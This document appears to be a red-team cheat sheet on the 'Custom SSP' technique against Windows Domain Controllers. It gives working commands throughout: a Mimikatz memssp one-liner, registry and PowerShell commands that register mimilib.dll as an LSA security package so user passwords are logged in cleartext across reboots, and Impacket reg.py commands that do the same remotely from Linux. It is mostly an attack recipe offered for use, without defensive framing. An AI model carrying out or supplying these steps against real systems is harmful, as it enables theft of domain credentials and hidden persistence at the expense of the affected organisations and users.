# Custom SSP

## Explanation

A Security Service Provider (SSP) is implemented via the Security Support Provider Interface (SSPI) which is part of the Windows Client Authentication Architecture.

The SSPI will dictate what protocols systems should use to authenticate between each other when communicating. The default protocol is Kerberos, however when not possible the following may also be utilized:

| SSP Protocol      | File Location                          |
|-------------------|----------------------------------------|
| Negotiate SSP     | `C:\Windows\System32\lsasrv.dll`       |
| Kerberos SSP      | `C:\Windows\System32\kerberos.dll`     |
| NTLM SSP          | `C:\Windows\System32\msv1_0.dll`       |
| Schannel SSP      | `C:\Windows\System32\Schannel.dll`     |
| Digest SSP        | `C:\Windows\System32\Wdigest.dll`      |
| CredSSP           | `C:\Windows\System32\credssp.dll`      |



### 1) Mimikatz (IN MEMORY. DOES NOT PERSIST AFTER REBOOT!)

    mimikatz "privilege::debug" "misc::memssp" "exit"

    C:\Windows\System32\kiwissp.log

### 2) Mimilib (PERSISTENT)

It is possible to inject a custom SSP into a target Domain Controller which can be used to intercept credentials and store them for later retrieval in plain text. Mimikatz comes with the ability to perform this interception with the mimilib.dll provided.

Copying the mimilib.dll file from Mimikatz into the SYSTEM32 folder and then adding the mimilib.dll file as a security package with the below command.

##### Create Key

    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ /f

##### Confirm changes

    reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

After completing and confirming changes, when a user next authenticates against the Domain Controller the credentials will be captured in cleartext in a file called kiwissp.txt inside SYSTEM32.

As these changes are made to the registry and a permanent file is dropping into SYSTEM32 this attack vector will persist after reboots.

BONUS

    $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages'
    $packages += "mimilib"
    Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages

## Linux

##### Retrieve the actual values of Security Package

    reg.py -dc-ip <DC_IP> 'domain.local'/'Administrator':'password'@dc.domain.local query -keyName 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\' -v 'Security Packages' -s

##### Append mimilib to the previous list

    reg.py -dc-ip <DC_IP> 'domain.local'/'Administrator':'password'@dc.domain.local add -keyName 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\' -v 'Security Packages' -vd "<list> mimilib" -vt REG_MULTI_SZ
